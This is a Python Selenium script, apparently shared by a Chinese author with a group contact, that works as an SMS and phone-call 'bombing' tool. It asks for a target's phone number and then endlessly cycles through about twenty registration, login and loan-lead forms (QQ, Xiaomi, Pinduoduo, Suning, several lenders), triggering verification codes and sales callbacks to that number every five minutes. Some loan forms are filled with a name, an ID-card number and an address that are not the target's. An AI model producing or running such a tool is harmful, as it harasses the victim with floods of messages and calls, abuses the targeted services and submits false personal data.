# coding=gbk
"""
作者：川川
公众号：玩转大数据
@时间  : 2022/2/3 0:29
群：428335755
"""

from selenium import webdriver
import time


driver = webdriver.Chrome(executable_path=r'C:\Users\hp\Downloads\chromedriver_win32\chromedriver.exe')



class HongZha:

    def __init__(self):
        self.phone = input('请输入您要轰炸的号码：')
        self.num = 0

    # 发送验证码
    def send_yzm(self,button,name):
        button.click()
        self.num+=1
        print("{}  第{}次  发送成功  {}".format(self.phone,self.num,name))

    # qq注册接口，反复测试后发现需要切换ip
    def qq(self,name):
        try:
            driver.get('https://ssl.zc.qq.com/v3/index-chs.html')
            driver.implicitly_wait(10)
            driver.find_element_by_xpath('//input[@id="nickname"]').send_keys('xxxx')
            driver.find_element_by_xpath('//input[@id="password"]').send_keys('woshinibaba22')
            driver.find_element_by_xpath('//input[@id="phone"]').send_keys(self.phone)
            button = driver.find_element_by_xpath('//a[@id="send-sms"]')
            self.send_yzm(button,name)
        except:
            print('本次失败')

    # 小米注册接口
    def xiaomi(self,name):
        try:
            driver.get('https://account.xiaomi.com/pass/register')
            driver.implicitly_wait(10)
            driver.find_element_by_xpath('//input[@name="phone"]').send_keys(self.phone)
            button = driver.find_element_by_xpath('//input[@type="submit"]')
            self.send_yzm(button,name)
        except:
            print('本次失败')


    # 瓜子注册接口
    def guazi(self,name):
        try:
            driver.implicitly_wait(10)
            driver.get ( "https://www.guazi.com/www/bj/buy" )
            a_btn = driver.find_element_by_xpath ( "//a[@class='uc-my']" )
            a_btn.click ()
            tel = driver.find_element_by_xpath ( "//input[@placeholder='请输入您的手机号码']" )
            tel.send_keys ( self.phone )
            button = driver.find_element_by_xpath ( "//button[@class='get-code']" )
            self.send_yzm ( button,name )
        except:
            print('本次失败')


    # 唯品会注册接口
    def wphui(self,name):
        try:
            driver.get ( "https://passport.vip.com/register?src=https%3A%2F%2Fwww.vip.com%2F" )
            driver.implicitly_wait(10)
            tel = driver.find_element_by_xpath ( "//input[@placeholder='请输入手机号码']" )
            tel.send_keys ( self.phone )
            driver.find_element_by_xpath ( '//a[contains(./text(),"获取验证码")]' ).click()
            button = driver.find_element_by_xpath ("//a[@class='ui-btn-medium btn-verify-code ui-btn-secondary']" )
            self.send_yzm ( button,name )
        except:
            print('本次失败')


    # 苏宁注册接口
    def suning(self,name):
        try:
            driver.get ( "https://reg.suning.com/person.do" )
            driver.implicitly_wait(10)
            tel = driver.find_element_by_xpath ( "//input[@id='mobileAlias']" )
            tel.send_keys ( self.phone )
            button = driver.find_element_by_xpath ("//a[@id='sendSmsCode']" )
            self.send_yzm ( button,name )
        except:
            print('本次失败')


    #一号店注册接口
    def yhd(self,name):
        try:
            driver.get ( "https://passport.yhd.com/passport/register_input.do" )
            driver.implicitly_wait(10)
            driver.find_element_by_xpath ( "//input[@id='userName']" ).send_keys("wujunya625")
            tel = driver.find_element_by_xpath ( "//input[@id='phone']" )
            tel.send_keys ( self.phone )
            button = driver.find_element_by_xpath ("//a[contains(./text(),'获取验证码')]" )
            self.send_yzm ( button,name )
        except:
            print('本次失败')


    # 有赞注册接口
    def youzan(self,name):
        try:
            driver.get('https://www.youzan.com/v2/account?from_source=baidu_pz_shouye_0&')
            driver.implicitly_wait(10)
            driver.find_element_by_xpath('//input[@name="mobile"]').send_keys(self.phone)
            button = driver.find_element_by_xpath('//button[contains(./text(),"获取验证码")]')
            self.send_yzm(button, name)
        except:
            print('本次失败')


    # 拼多多短信登陆接口
    def pinduoduo(self,name):
        try:
            driver.get('http://mobile.yangkeduo.com/login.html')
            driver.implicitly_wait(10)
            driver.find_element_by_xpath('//div[@class="phone-login"]/span').click()
            driver.find_element_by_xpath('//input[@id="user-mobile"]').send_keys(self.phone)
            button=driver.find_element_by_xpath('//button[@id="code-button"]')
            self.send_yzm(button, name)
        except:
            print('本次失败')


    # 大众点评登陆接口
    def dianping(self,name):
        try:
            driver.get('https://maccount.dianping.com/login')
            driver.implicitly_wait(10)
            driver.find_element_by_xpath('//input[@name="mobile"]').send_keys(self.phone)
            button = driver.find_element_by_xpath('//a[@class="J_send EasyLogin_send"]')
            self.send_yzm(button, name)
        except:
            print('本次失败')


    # 支付宝注册点击发送按钮无法成功
    def zhifubao(self,name):
        driver.get('https://memberprod.alipay.com/account/reg/index.htm')
        driver.implicitly_wait(10)
        iframe = driver.find_element_by_xpath('//iframe')
        driver.switch_to.frame(iframe)
        driver.find_element_by_xpath('//a[@seed="content-JAgreeButton"]').click()
        driver.find_element_by_xpath('//input[@id="J-accName"]').send_keys(self.phone)
        # button = driver.find_element_by_xpath('//button[@seed="JResendMobile-btn"]')
        button = driver.find_element_by_xpath('//button[contains(./text(),"获取验证码")]')

        for i in range(3):
            button.click()
        self.send_yzm(button, name)

    #诺亚财富
    def nuoyacaifu(self,name):
        driver.get('https://ifaclubstatic.noahgroup.com/baidu/pc2/index.html')
        driver.implicitly_wait(10)
        driver.find_element_by_xpath('//input[@id="register_name"]').send_keys('校长')
        driver.find_element_by_xpath('//input[@id="register_phone"]').send_keys(self.phone)

        # driver.find_element_by_xpath('//input[@name="mobile"]').send_keys(self.phone)
        button=driver.find_element_by_xpath('//button[@id="register_getcode"]')
        self.send_yzm(button, name)

    # 弹个车
    def tangeche(self,name):
        for i in range(3):
            driver.get('https://www.tangeche.com/market')
            time.sleep(0.1)
        # driver.implicitly_wait(10)
        driver.find_element_by_xpath('//input[@placeholder="请输入您的手机号"]').send_keys(self.phone)
        button=driver.find_element_by_xpath('//div[contains(./text(),"咨询更多优惠")]')
        self.send_yzm(button,name)

    # 大作手金融----销售电话轰炸
    def dazuoshousell(self,name):
        while True:
            try:

                driver.get('http://www.jinrongdazuoshou.com/bdtg/')
                # time.sleep(1)
                # driver.get('h17803403206ttp://www.jinrongdazuoshou.com/bdtg/')
                # driver.implicitly_wait(10)
                driver.find_element_by_xpath('//input[@id="para116"]').send_keys('校长')
                driver.find_element_by_xpath('//input[@name="para117"]').send_keys(self.phone)
                button=driver.find_element_by_xpath('//a[@name="submit"]')
                self.send_yzm(button,name)
                break
            except:
                print('restart.......')

        alert=driver.switch_to_alert()
        alert.accept()


    # 多彩投
    def duocaitou(self,name):
        driver.get('https://www.duocaitou.com/login?redirect=%2F')
        driver.implicitly_wait(10)
        driver.find_element_by_xpath('//input[@placeholder="请输入手机号"]').send_keys(self.phone)
        button=driver.find_element_by_xpath('//button[@class="getCode ivu-btn ivu-btn-text"]')
        self.send_yzm(button,name)


    # 你我贷
    def niwodai(self,name):
        driver.get('http://www.niwodai.com/ad2018.mhtml?artId=5820160000027066&utm_source=Baidu&utm_medium=cpc&cid=Search-PC-bd03-Shanghai-20170411-10001&nwd_ext_aid=3000001481188029&source_id=Search-PC-bd03-Shanghai-20170411-10001')
        driver.implicitly_wait(10)
        driver.find_element_by_xpath('//input[@name="mobile"]').send_keys(self.phone)
        button=driver.find_element_by_xpath('//em[@id="getPhonecode"]')
        self.send_yzm(button,name)

    # 华为云注册chromedriver被识别
    def huaweiyun(self,name):
        driver.get('https://reg.huaweicloud.com/registerui/public/custom/register.html#/register')
        driver.implicitly_wait(10)
        driver.find_element_by_xpath('//input[@id="accountNameId"]').send_keys('xianozhang')
        driver.find_element_by_xpath('//input[@id="passwordId"]').send_keys('nishijiba22')
        driver.find_element_by_xpath('//input[@id="confirmPasswordId"]').send_keys('nishijiba22')
        driver.find_element_by_xpath('//input[@id="phoneId"]').send_keys(self.phone)
        button=driver.find_element_by_xpath('//span[contains(./text(),"获取短信验证码")]')
        self.send_yzm(button,name)






    # 宜人贷chromedriver被识别
    def yirendai(self,name):
        driver.get('https://www.yirencf.com/lp/431/5/')
        driver.implicitly_wait(10)
        driver.find_element_by_xpath('//input[@id="mobile"]').send_keys(self.phone)
        driver.find_element_by_xpath('//input[@id="paper"]').click()
        button=driver.find_element_by_xpath('//span[@id="SM_TXT_1"]')
        self.send_yzm(button,name)
        time.sleep(2)

    # 贷款留号码给销售
    def daikuai(self,name):
        # 13636356336
        username = '张向荣'
        idcard = '430581198208082837'
        address = '上海市浦东新区杨思路'
        driver.get('http://daikuai.lnxhxd.com/')
        driver.find_element_by_xpath('//input[@id="name"]').send_keys(username)
        driver.find_element_by_xpath('//input[@id="idcard"]').send_keys(idcard)
        driver.find_element_by_xpath('//input[@id="tel"]').send_keys(self.phone)
        driver.find_element_by_xpath('//input[@id="address"]').send_keys(address)
        driver.find_element_by_xpath('//select[@id="money"]').click()
        driver.find_element_by_xpath('//option[@value="10万"]').click()
        driver.find_element_by_xpath('//select[@id="qixian"]').click()
        driver.find_element_by_xpath('//option[@value="3年(36期)"]').click()
        driver.find_element_by_xpath('//select[@id="yongtu"]').click()
        driver.find_element_by_xpath('//option[@value="创业贷款"]').click()
        button = driver.find_element_by_xpath('//button[@name="zntjan"]')
        self.send_yzm(button,name)
        alert=driver.switch_to_alert()
        alert.accept()

    #     平安好贷
    def pinanhaodai(self,name):
        username = '张向荣'
        driver.get('http://haodai.pingan.com/loan/index.html?WT.mc_id=ZTXYD-bdpc-pc1-tyc-821-0051220&WT.srch=1')
        driver.find_element_by_xpath('//input[@id="name"]').send_keys(username)
        driver.find_element_by_xpath('//input[@id="phone"]').send_keys(self.phone)
        button=driver.find_element_by_xpath('//div[@id="loan_next"]')
        self.send_yzm(button,name)
        # driver.find_element_by_xpath('//div[@id="curLocationPr"]').click()
        # driver.find_element_by_xpath('//li[@data-value="110000"]').click()
        # driver.find_element_by_xpath('//input[@id="y-m-d"]').click()
        # driver.find_element_by_xpath('//td[@class="Wwday"][1]').click()
        # driver.find_element_by_xpath('//div[@id="btn"]').click()

    # 360贷款
    def dai360(self,name):
        driver.get('https://cdn-daikuan.360jie.com.cn/dir_mkteditor/activity/qmmx/pc/1.3.0/12m1pcdz.html?utm_term=daikuan&utm_campaign=12mianshouqipc_201708&utm_medium=search1&utm_source=jinyuanbaiducpc360jietiao&utm_content=pinpai-banben')
        driver.find_element_by_xpath('//a[@class="get-btn"]').click()
        driver.switch_to_active_element()

        driver.find_element_by_xpath('//input[@id="mobile"]').send_keys(self.phone)
        button=driver.find_element_by_xpath('//a[@class="btnSendCode"]')
        self.send_yzm(button,name)

    # 拼趣多
    def pinquduo(self,name):
        driver.get('https://wx.pinquduo.cn/login')
        driver.find_element_by_xpath('//input[@type="tel"]').send_keys(self.phone)
        button=driver.find_element_by_xpath('//span[contains(./text(),"获取验证码")]')
        self.send_yzm(button,name)

    # 平安惠普；留号码给销售
    def pinanhuipu(self,name):
        driver.get('http://paph.adks.cn/page/pc-1011/?utm_source=MKT_baidu_ss&utm_medium=cpc&utm_campaign=Market-c&WT.mc_id=CXX-BD-TY2160129-160413-460&')
        driver.find_element_by_xpath('//input[@name="name"]').send_keys('张向荣')
        driver.find_element_by_xpath('//input[@id="mobile"]').send_keys(self.phone)
        driver.find_element_by_xpath('//input[@id="nextsub"]').click()
        driver.find_element_by_xpath('//dt[contains(./text(),"请选择年龄段")]').click()
        driver.find_element_by_xpath('//a[contains(./text(),"21周岁以下")]').click()
        driver.find_element_by_xpath('//input[@name="isCreditCard" and @value="1"]').click()
        driver.find_element_by_xpath('//input[@name="input_area"]').click()
        driver.find_element_by_xpath('//li[contains(./text(),"南通")]').click()
        driver.find_element_by_xpath('//input[@name="liveTime"]').click()
        driver.find_element_by_xpath('//input[@name="hasHouseLoan"]').click()
        driver.find_element_by_xpath('//input[@name="hasCar"]').click()
        driver.find_element_by_xpath('//input[@name="payCarLoan"]').click()
        driver.find_element_by_xpath('//input[@name="hasLifeInsurance"]').click()
        driver.find_element_by_xpath('//input[@name="lifeInsuranceTotal"]').click()
        driver.find_element_by_xpath('//button[@class="nextStep"]').click()
        self.num+=1
        print("{}  第{}次  发送成功  {}".format(self.phone,self.num,name))



    # 循环执行
    def main(self):
        while True:
            # 反复测试后发现qq接口需要切换ip
            self.qq('qq')
            self.xiaomi('小米')
            self.guazi('瓜子')
            self.wphui('唯品会')
            self.suning('苏宁')
            self.yhd('一号店')
            self.youzan('有赞')
            self.pinduoduo('拼多多')
            self.dianping('大众点评')
            self.tangeche('弹个车')
            self.nuoyacaifu('诺亚财富')
            self.dazuoshousell('金融大作手')
            self.duocaitou('p2p多彩投')
            self.niwodai('你我贷')
            # self.huaweiyun('华为云')
            # self.yirendai('宜人贷')
            self.daikuai('daikuai')
            self.pinanhaodai('平安好贷')
            self.dai360('360借条')
            self.pinquduo('拼趣多')
            self.pinanhuipu('平安惠普')
            time.sleep(60*5)

if __name__ == '__main__':
    hongzha = HongZha()
    hongzha.main()